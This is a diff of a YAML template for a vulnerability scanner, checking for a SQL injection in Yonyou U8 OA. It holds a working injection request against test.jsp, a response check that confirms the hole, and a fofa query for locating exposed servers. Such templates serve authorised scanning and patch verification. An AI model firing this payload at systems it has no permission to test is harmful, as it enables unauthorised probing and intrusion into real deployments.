@@ -1,16 +1,21 @@
 id: yonyou-u8-oa-sqli
 
 info:
-    name: Yonyou U8 OA sqli
-    author: kzaopa(https://github.com/kzaopa
-    severity: high
+  name: Yonyou U8 OA sqli
+  author: kzaopa
+  severity: high
+  verified: true
+  description: |
+    fofa: app="用友-U8"
+  tags: yonyou,u8,oa,sqli
+  created: 2025/03/13
 
 set:
-    rand: randomInt(200000000, 220000000)
+  rand: randomInt(200000000, 220000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
-        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+  r0:
+    request:
+      method: GET
+      path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
 expression: r0()
